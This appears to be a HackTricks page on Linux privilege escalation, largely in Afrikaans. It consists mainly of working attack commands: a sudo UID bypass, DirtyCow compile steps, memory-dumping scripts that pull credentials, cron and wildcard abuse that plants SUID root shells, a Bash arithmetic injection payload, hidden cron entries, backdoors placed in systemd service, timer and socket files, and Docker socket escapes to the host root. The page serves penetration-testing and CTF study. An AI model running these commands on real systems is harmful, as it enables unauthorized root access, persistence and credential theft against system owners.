# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om inligting te versamel oor die OS wat tans loop.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

As jy **skryfregte op enige vouer binne die `PATH`-veranderlike het**, kan jy dalk sommige libraries of binaries kap:
```bash
echo $PATH
```
### Env info

Is daar interessante inligting, wagwoorde of API-sleutels in die omgewingsvariabels?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel-weergawe en of daar enige exploit is wat gebruik kan word om privileges te eskaleer.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernel-weergawes en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes vanaf daardie webwerf te onttrek kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer IN die slagoffer uit, kontroleer slegs exploits vir kernel 2.x)

Soek altyd **die kernel-weergawe op Google**, miskien is jou kernel-weergawe in 'n kernel exploit genoem en sal jy dan seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-weergawe

Gebaseer op die kwesbare sudo weergawes wat in die volgende verskyn:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelsel-enumerasie
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Som moontlike verdedigings op

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer om daaruit te ontsnap:


{{#ref}}
docker-security/
{{#endref}}

## Skywe

Kontroleer **wat gemonteer en ongemonteer is**, waar en waarom. As iets ongemonteer is, kan jy probeer om dit te monteer en na privaat inligting te kyk.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Som nuttige binaries op
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **any compiler is installed**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien waar jy dit gaan gebruik (of op een soortgelyke) te compile.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ouer Nagios-weergawe (byvoorbeeld) wat misbruik kan word om escalating privileges te verkry…\
Dit word aanbeveel om die weergawes van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat in die masjien geïnstalleer is.

> [!NOTE] > _Let wel dat hierdie opdragte baie inligting sal wys wat meestal nutteloos sal wees, daarom word toepassings soos OpenVAS of soortgelyks aanbeveel wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort te hê** (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ook **kontroleer jou voorregte oor die prosesse se binaries**, dalk kan jy iemand se binaries oorskryf.

### Process monitoring

Jy kan hulpmiddels soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes vervul is.

### Process memory

Sommige dienste op 'n bediener stoor **credentials in clear text inside the memory**.\
Gewoonlik het jy **root privileges** nodig om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

> [!WARNING]
> Let daarop dat deesdae die meeste masjiene **ptrace nie standaard toelaat nie**, wat beteken dat jy nie ander prosesse wat aan jou onbevoorregte gebruiker behoort kan dump nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

As jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en in sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, **maps toon hoe geheue binne daardie proses se** virtuele adresruimte toegeken is; dit wys ook die **toestemmings van elke gekarteerde streek**. Die **mem** pseudo-lêer **blootstel die proses se geheue self**. Uit die **maps** file weet ons watter **geheuegebiede leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem file te seek en alle leesbare gebiede te dump** na 'n lêer.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan benader word met behulp van /dev/kmem.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir linux

ProcDump is 'n Linux-herontwerp van die klassieke ProcDump tool uit die Sysinternals-suite vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om 'n prosesgeheue te dump, kan jy gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig root vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Kredensiale uit prosesgeheue

#### Manuele voorbeeld

As jy vind dat die authenticator-proses aan die loop is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die process dump (sien vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en in die memory na credentials soek:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike-tekst inlogbewyse uit die geheue steel** en uit sommige **bekende lêers**. Dit vereis root-bevoegdhede om behoorlik te werk.

| Funksie                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron jobs

### Crontab UI (alseambusher) wat as root loop – web-based scheduler privesc

As 'n web "Crontab UI" paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gebind is, kan jy dit steeds via SSH local port-forwarding bereik en 'n bevoorregte taak skep om privilegieë te eskaleer.

Tipiese ketting
- Ontdek 'n slegs-loopback-poort (bv., 127.0.0.1:8000) en Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind inlogbewyse in operasionele artefakte:
- Rugsteun-/skrip-lêers met `zip -P <password>`
- systemd unit wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` blootstel
- Tunnel en aanmelding:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep 'n high-priv job en voer dit onmiddellik uit (gee 'n SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Verharding
- Moenie Crontab UI as root laat loop nie; beperk dit tot 'n toegewyde gebruiker met minimale permissies
- Bind to localhost en beperk toegang bykomend via firewall/VPN; moenie wagwoorde hergebruik nie
- Moenie secrets in unit files insluit nie; gebruik secret stores of 'n root-only EnvironmentFile
- Skakel audit/logging in vir on-demand job executions



Kontroleer of enige geskeduleerde job kwesbaar is. Miskien kan jy voordeel trek uit 'n script wat deur root uitgevoer word (wildcard vuln? kan jy lêers wat root gebruik wysig? gebruik symlinks? skep spesifieke lêers in die directory wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As binne hierdie crontab die root-gebruiker probeer om 'n opdrag of skrip uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\

Dan kan jy 'n root shell kry deur te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” in 'n kommando voorkom, kan jy dit uitbuit om onvoorsiene dinge te laat gebeur (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **nie).**

Lees die volgende bladsy vir meer wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) and let plaasvind. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Hoekom dit werk: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Tipiese kwesbare patroon:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Indien jy **can modify a cron script** executed by root, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **gids waarop jy volle toegang het** gebruik, kan dit dalk nuttig wees om daardie gids te verwyder en 'n **symlink-gids na 'n ander een te skep** wat 'n script wat deur jou beheer word uitvoer
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daarvan voordeel trek en privilege escalation uitvoer.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **sorteer volgens min uitgevoerde opdragte** en die opdragte wat die meeste uitgevoer is te verwyder, kan jy:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin monitor en lys).

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep **deur 'n carriage return na 'n kommentaar te plaas** (sonder newline-karakter), en die cronjob sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ files

Kyk of jy enige `.service` lêer kan skryf, as jy kan, kan jy dit **wysig** sodat dit jou **backdoor** **uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (jy sal moontlik moet wag totdat die masjien herbegin word).\
Byvoorbeeld, skep jou backdoor binne die `.service` lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diens-uitvoerbare lêers

Hou in gedagte dat as jy **skryfregte oor uitvoerbare lêers wat deur dienste uitgevoer word** het, jy hulle kan verander om backdoors in te sit, sodat wanneer die dienste weer uitgevoer word, die backdoors ook uitgevoer sal word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
Indien jy uitvind dat jy in enige van die vouers van die pad kan **skryf**, mag jy dalk in staat wees om **escalate privileges**. Jy moet soek na **relatiewe paaie wat in service-konfigurasielêers gebruik word**, soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **executable** met die **same name as the relative path binary** binne die systemd PATH-lêergids waarvoor jy skryfregte het, en wanneer die service gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor** uitgevoer word (onbevoorregte gebruikers kan gewoonlik nie diensse begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd unit-lêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning vir kalender-tydgebeurtenisse en monotonic time events het en asynchroon uitgevoer kan word.

Jy kan alle timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit laat uitvoer om sekere bestaande systemd.unit-eenhede (soos 'n `.service` of 'n `.target`) aan te roep.
```bash
Unit=backdoor.service
```
> Die unit wat geaktiveer moet word wanneer hierdie timer verstryk. Die argument is 'n unit-naam, waarvan die agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, val hierdie waarde terug op 'n service wat dieselfde naam as die timer-unit het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die unit-naam wat geaktiveer word en die unit-naam van die timer-unit identies benoem is, behalwe vir die agtervoegsel.

Dus, om hierdie toestemming te misbruik sal jy nodig hê om:

- Vind 'n systemd unit (soos 'n `.service`) wat **'n skryfbare binêre** uitvoer
- Vind 'n systemd unit wat **'n relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd PATH** (om daardie executable te imiteer)

**Leer meer oor timers met `man systemd.timer`.**

### **Timer inskakeling**

Om 'n timer in te skakel benodig jy root-regte en om die volgende uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Neem kennis dat die **timer** geaktiveer word deur 'n symlink daarna te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) stel **proseskommunikasie** in staat op dieselfde of verskillende masjiene binne kliënt-bediener modelle. Hulle gebruik standaard Unix-deskriptorlêers vir inter-rekenaar kommunikasie en word opgestel deur `.socket` lêers.

Sockets kan geconfigureer word met behulp van `.socket` lêers.

**Leer meer oor sockets met `man systemd.socket`.** In hierdie lêer kan verskeie interessante parameter gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar 'n samevatting word gebruik om te **aandui waar dit na die socket gaan luister** (die pad van die AF_UNIX socket-lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
- `Accept`: Neem 'n boolean-argument. As **true**, word 'n **service instance vir elke inkomende verbinding geskep** en slegs die verbindings-socket aan dit deurgegee. As **false**, word al die luister-sockets self **aan die gestarte service unit deurgegee**, en slegs een service unit word geskep vir alle verbindings. Hierdie waarde word geïgnoreer vir datagram sockets en FIFOs waar 'n enkele service unit onvoorwaardelik al die inkomende verkeer hanteer. **Standaard: false**. Vir prestasie-redes word dit aanbeveel om nuwe daemons slegs te skryf op 'n wyse wat geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls, wat onderskeidelik **uitgevoer word voordat** of **nadat** die luister-**sockets**/FIFOs **geskep** en gebind word. Die eerste token van die opdragreël moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat onderskeidelik **uitgevoer word voordat** of **nadat** die luister-**sockets**/FIFOs **gesluit** en verwyder word.
- `Service`: Spesifiseer die **service** unit-naam **om te aktiveer** by **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met `Accept=no`. Dit is standaard die service wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Writable .socket files

As jy 'n **skryfbare** `.socket` lêer vind, kan jy aan die begin van die `[Socket]` afdeling iets soos: `ExecStartPre=/home/kali/sys/backdoor` byvoeg en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag tot die masjien herbegin is.**\
_Neem kennis dat die stelsel daardie socket-lêer konfigurasie moet gebruik, anders sal die backdoor nie uitgevoer word nie_

### Writable sockets

As jy 'n **skryfbare socket** identifiseer (_nou praat ons van Unix Sockets en nie van die konfigurasie `.socket` lêers nie_), dan **kan jy met daardie socket kommunikeer** en dalk 'n kwesbaarheid uitbuit.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rou verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Eksploitasievoorbeeld:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let daarop dat daar dalk 'n paar **sockets listening for HTTP** requests (_Ek praat nie van .socket files nie maar van die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die soket **op 'n HTTP-versoek reageer**, kan jy **met dit kommunikeer** en dalk **exploit some vulnerability**.

### Skryfbare Docker-soket

Die Docker-soket, dikwels te vinde by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Per verstek is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryftoegang tot hierdie soket te hê, kan lei tot privilege escalation. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy skryftoegang tot die Docker-soket het, kan jy escalate privileges deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte stel jou in staat om 'n container te laat loop met root-vlak toegang tot die gasheer se lêerstelsel.

#### **Gebruik Docker API direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker-sok nog steeds gemanipuleer word met die Docker API en `curl` opdragte.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die gasheer se root-directory mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuut geskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n verbinding met die container te vestig, wat opdraguitvoering daarin moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat die `socat`-verbinding ingestel is, kan jy opdragte direk in die container uitvoer met root-vlak toegang tot die gasheer se lêerstelsel.

### Ander

Let wel dat as jy skryfbevoegdhede oor die docker-sok het omdat jy **in die groep `docker` is** jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk vir **meer maniere om uit docker te breek of dit te misbruik om voorregte te eskaleer** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy uitvind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde **inter-Process Communication (IPC) system** wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruil tussen prosesse verbeter, soortgelyk aan **enhanced UNIX domain sockets**. Verder help dit met die uitsending van gebeure of seine, en bevorder naatlose integrasie tussen stelselkomponente. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler laat stilmaak, wat die gebruikerservaring verbeter. Boonop ondersteun D-Bus 'n remote object system, wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig en prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n **allow/deny model**, en bestuur boodskaptoestemmings (metode-oproepe, sein-uitsendings, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide bepaal interaksies met die bus en kan moontlik voorsiening maak vir voorregte-eskalasie deur die uitbuiting van hierdie toestemmings.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat die toestemmings vir die root-gebruiker uiteensit om `fi.w1.wpa_supplicant1` te besit, boodskappe daarheen te stuur en boodskappe daarvan te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep is universieel van toepassing, terwyl "default" konteksbeleide van toepassing is op allegene wat nie deur ander spesifieke beleide gedek word nie.
